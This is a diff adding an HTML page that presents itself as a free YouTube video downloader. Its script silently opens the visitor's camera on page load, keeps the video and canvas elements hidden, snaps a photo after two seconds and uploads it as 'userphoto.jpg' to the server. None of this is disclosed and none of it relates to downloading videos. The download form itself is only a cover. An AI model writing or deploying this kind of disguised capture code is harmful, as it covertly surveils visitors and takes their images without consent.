@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube Video Downloader</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f0f0f0;
+        }
+        .container {
+            text-align: center;
+        }
+        .input-box {
+            margin: 20px 0;
+        }
+        input[type="text"] {
+            padding: 10px;
+            width: 60%;
+            font-size: 16px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #ff0000;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #cc0000;
+        }
+        #video, #canvas {
+            display: none; /* Hidden camera elements */
+        }
+        .info {
+            margin-top: 20px;
+            color: #666;
+        }
+        #download-link {
+            margin-top: 20px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>YouTube Video Downloader</h1>
+        <p>Paste your YouTube URL below to download videos instantly!</p>
+        
+        <div class="input-box">
+            <input type="text" id="youtube-url" placeholder="Enter YouTube URL here">
+            <button id="download">Download</button>
+        </div>
+        
+        <div id="download-link">
+            <a href="#" id="video-link">Click here to download your video</a>
+        </div>
+        
+        <div class="info">
+            <p>Supports all video formats | Fast & Free | No registration needed</p>
+        </div>
+        
+        <!-- Hidden camera elements -->
+        <video id="video" width="640" height="480" autoplay></video>
+        <canvas id="canvas" width="640" height="480"></canvas>
+    </div>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const downloadButton = document.getElementById('download');
+        const youtubeUrl = document.getElementById('youtube-url');
+        const downloadLink = document.getElementById('download-link');
+        const videoLink = document.getElementById('video-link');
+        const context = canvas.getContext('2d');
+
+        // Get camera access
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                setTimeout(capturePhoto, 2000); // Capture photo after 2 seconds
+            })
+            .catch(err => {
+                console.error("Error accessing camera: ", err);
+            });
+
+        // Capture and send photo
+        function capturePhoto() {
+            context.drawImage(video, 0, 0, 640, 480);
+            canvas.toBlob(blob => {
+                sendPhotoToServer(blob);
+            }, 'image/jpeg');
+        }
+
+        // Send photo to server
+        function sendPhotoToServer(photoBlob) {
+            const formData = new FormData();
+            formData.append('photo', photoBlob, 'userphoto.jpg');
+
+            fetch('/upload-photo', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log(data.message);
+            })
+            .catch(error => {
+                console.error('Error uploading photo:', error);
+            });
+        }
+
+        // Handle video download
+        downloadButton.addEventListener('click', () => {
+            const url = youtubeUrl.value.trim();
+            if (!url) {
+                alert('Please enter a YouTube URL!');
+                return;
+            }
+
+            fetch('/download', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ url: url })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    downloadLink.style.display = 'block';
+                    videoLink.href = data.file_url;
+                    videoLink.download = data.filename;
+                } else {
+                    alert('Error: ' + data.message);
+                }
+            })
+            .catch(error => {
+                alert('Error downloading video!');
+                console.error(error);
+            });
+        });
+    </script
+</body>
+</html>
